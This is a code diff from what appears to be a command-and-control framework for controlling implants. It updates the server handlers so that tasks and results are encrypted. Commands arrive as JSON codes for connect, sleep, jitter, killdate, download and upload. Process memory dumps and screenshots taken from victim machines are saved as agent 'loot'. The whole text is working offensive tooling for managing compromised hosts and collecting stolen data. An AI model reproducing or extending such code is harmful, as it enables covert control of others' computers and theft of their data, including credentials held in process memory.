@@ -14,6 +14,7 @@ import (
 	"github.com/gorilla/websocket"
 
 	"github.com/hideckies/hermit/pkg/common/certs"
+	"github.com/hideckies/hermit/pkg/common/crypt"
 	"github.com/hideckies/hermit/pkg/common/meta"
 	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
 	"github.com/hideckies/hermit/pkg/common/stdout"
@@ -23,6 +24,7 @@ import (
 	"github.com/hideckies/hermit/pkg/server/job"
 	"github.com/hideckies/hermit/pkg/server/listener"
 	"github.com/hideckies/hermit/pkg/server/state"
+	_task "github.com/hideckies/hermit/pkg/server/task"
 )
 
 var upgrader = websocket.Upgrader{}
@@ -224,14 +226,17 @@ func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 			return
 		}
 		// Get the first task and remove it from task list
-		task := tasks[0]
-		err = metafs.DeleteAgentTask(targetAgent.Name, task, false)
+		currTask := tasks[0]
+		err = metafs.DeleteAgentTask(targetAgent.Name, currTask, false)
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Error: Failed to delete a task from file.")
 			return
 		}
 
-		ctx.String(http.StatusOK, task)
+		// Encrypt the task
+		encTask := crypt.Encrypt(currTask)
+
+		ctx.String(http.StatusOK, encTask)
 	}
 	return gin.HandlerFunc(fn)
 }
@@ -259,88 +264,124 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			return
 		}
 
-		task := ctx.GetHeader("X-Task")
-
-		// Get the task result.
-		data, err := ctx.GetRawData()
+		// Get task
+		taskEnc := ctx.GetHeader("X-Task") // This value is Encrypted
+		// Decrypt
+		task, err := crypt.Decrypt(taskEnc)
 		if err != nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Error: Failed to decrypt task.")
+			return
+		}
+		// Parse JSON
+		var taskJSON _task.Task
+		json.Unmarshal([]byte(task), &taskJSON)
+
+		// Get result data (encrypted).
+		dataEnc, err := ctx.GetRawData()
+		if err != nil {
+			ctx.String(http.StatusBadRequest, "Failed to get the task result.")
+			return
+		}
+		// Decrypt task result.
+		dataDecStr, err := crypt.Decrypt(string(dataEnc))
+		if err != nil {
+			ctx.String(http.StatusBadRequest, "Failed to decrypt the task result.")
 			return
 		}
 
+		// Parse JSON
+		var taskResult _task.TaskResult
+		if dataDecStr != "" {
+			if err := json.Unmarshal([]byte(dataDecStr), &taskResult); err != nil {
+				ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
+				return
+			}
+		}
+
 		content := ""
-		switch {
-		case strings.HasPrefix(task, "connect "):
+		switch taskJSON.Command.Code {
+		case _task.TASK_CONNECT:
 			// Update listener URL of the agent on the database.
-			targetAgent.ListenerURL = string(data)
+			targetAgent.ListenerURL = taskResult.Result
 			database.AgentUpdate(targetAgent)
 
 			content = "Listener URL has been updated."
-		case strings.HasPrefix(task, "download "):
-			downloadPath := string(data)
+		case _task.TASK_DOWNLOAD:
+			downloadPath := taskResult.Result
 			content = fmt.Sprintf("Downloaded at %s", downloadPath)
-		case strings.HasPrefix(task, "jitter "):
-			jitterTimeStr := strings.Split(task, " ")[1]
-			jitterTime, err := strconv.ParseUint(jitterTimeStr, 10, 64)
+		case _task.TASK_JITTER:
+			timeStr := taskJSON.Args["time"]
+			time, err := strconv.ParseUint(timeStr, 10, 64)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			// Update jitter time on the database
-			targetAgent.Jitter = uint(jitterTime)
+			targetAgent.Jitter = uint(time)
 			err = database.AgentUpdate(targetAgent)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			content = "The jitter time has been updated."
-		case strings.HasPrefix(task, "killdate "):
-			killDateStr := strings.Split(task, " ")[1]
-			killDate, err := strconv.ParseUint(killDateStr, 10, 64)
+		case _task.TASK_KILLDATE:
+			dtStr := taskJSON.Args["datetime"]
+			dt, err := strconv.ParseUint(dtStr, 10, 64)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			// Update killdate on the database
-			targetAgent.KillDate = uint(killDate)
+			targetAgent.KillDate = uint(dt)
 			err = database.AgentUpdate(targetAgent)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			content = "The killdate has been updated."
-		case strings.HasPrefix(task, "procdump "), task == "screenshot":
-			// Write a dump file.
-			outFile, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, task)
+		case _task.TASK_PROCDUMP:
+			agLootDir, err := metafs.GetAgentLootDir(targetAgent.Name, false)
 			if err != nil {
-				ctx.String(http.StatusBadRequest, "")
+				ctx.String(http.StatusBadRequest, "Failed to get agent loot directory.")
 				return
 			}
-			content = fmt.Sprintf("Saved at %s", outFile)
-		case strings.HasPrefix(task, "sleep "):
-			sleepTimeStr := strings.Split(task, " ")[1]
-			sleepTime, err := strconv.ParseUint(sleepTimeStr, 10, 64)
+			content = fmt.Sprintf("Saved file under %s/procdumps", agLootDir)
+		case _task.TASK_SCREENSHOT:
+			agLootDir, err := metafs.GetAgentLootDir(targetAgent.Name, false)
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "Failed to get agent loot directory.")
+				return
+			}
+			content = fmt.Sprintf("Saved file under %s/screenshots", agLootDir)
+		case _task.TASK_SLEEP:
+			timeStr := taskJSON.Args["time"]
+			time, err := strconv.ParseUint(timeStr, 10, 64)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			// Update sleep time on the database
-			targetAgent.Sleep = uint(sleepTime)
+			targetAgent.Sleep = uint(time)
 			err = database.AgentUpdate(targetAgent)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
 				return
 			}
 			content = "The sleep time has been updated."
-		case strings.HasPrefix(task, "upload "):
-			uploadPath := string(data)
+		case _task.TASK_UPLOAD:
+			uploadPath := taskResult.Result
 			content = fmt.Sprintf("Uploaded at %s", uploadPath)
 		default:
-			content = string(data)
+			content = taskResult.Result
 		}
 
 		// Write the task result to a file.
-		_, err = metafs.WriteAgentLoot(targetAgent.Name, task, content, false)
+		taskName, err := taskResult.Task.Encode()
+		if err != nil {
+			ctx.String(http.StatusBadRequest, "")
+			return
+		}
+		_, err = metafs.WriteAgentLoot(targetAgent.Name, taskName, content, false)
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "")
 			return
@@ -373,29 +414,66 @@ func handleImplantUpload(database *db.Database) gin.HandlerFunc {
 			return
 		}
 
-		// Get the download path
-		downloadPath := ctx.GetHeader("X-File")
-		// Check if the file already exists
-		if _, err := os.Stat(downloadPath); err == nil {
+		// Get file data (encrypted)
+		dataEnc, err := ctx.GetRawData()
+		if err != nil {
 			ctx.String(http.StatusBadRequest, "")
 			return
 		}
-
-		// Read data from the file
-		data, err := ctx.GetRawData()
+		// Decrypt
+		data, err := crypt.DecryptData(dataEnc)
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "")
 			return
 		}
 
-		// Save the file
-		err = os.WriteFile(downloadPath, data, 0644)
+		// Get task
+		taskEnc := ctx.GetHeader("X-Task") // This value is Encrypted
+		// Decrypt
+		task, err := crypt.Decrypt(taskEnc)
 		if err != nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Error: Failed to decrypt task.")
+			return
+		}
+		// Parse JSON
+		var taskJSON _task.Task
+		json.Unmarshal([]byte(task), &taskJSON)
+
+		if taskJSON.Command.Code == _task.TASK_DOWNLOAD {
+			// Get the download path
+			downloadPath := ctx.GetHeader("X-File")
+			// Check if the file already exists
+			if _, err := os.Stat(downloadPath); err == nil {
+				ctx.String(http.StatusBadRequest, "File already exists.")
+				return
+			}
+
+			// Save the file
+			err = os.WriteFile(downloadPath, data, 0644)
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "Failed to write file.")
+				return
+			}
+		} else if taskJSON.Command.Code == _task.TASK_PROCDUMP {
+			// Save file
+			_, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, fmt.Sprintf("procdump %s", taskJSON.Args["pid"]))
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "Failed to write file.")
+				return
+			}
+		} else if taskJSON.Command.Code == _task.TASK_SCREENSHOT {
+			// Save file
+			_, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, "screenshot")
+			if err != nil {
+				ctx.String(http.StatusBadRequest, "Failed to write file.")
+				return
+			}
+		} else {
+			ctx.String(http.StatusBadRequest, "Invalid task command.")
 			return
 		}
 
-		ctx.String(http.StatusOK, "")
+		ctx.String(http.StatusOK, "Uploaded successfully.")
 	}
 	return gin.HandlerFunc(fn)
 }
